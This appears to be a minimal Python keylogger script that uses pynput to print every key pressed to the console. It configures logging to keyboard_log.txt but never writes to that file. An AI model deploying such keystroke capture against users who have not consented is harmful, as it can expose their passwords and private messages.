from pynput import keyboard
import logging

logging.basicConfig(filename=("keyboard_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press_recording(key):
    print(key)


def on_press_release(key):
    pass


with keyboard.Listener(on_press=on_press_recording, on_release=on_press_release) as listener:
    listener.join()
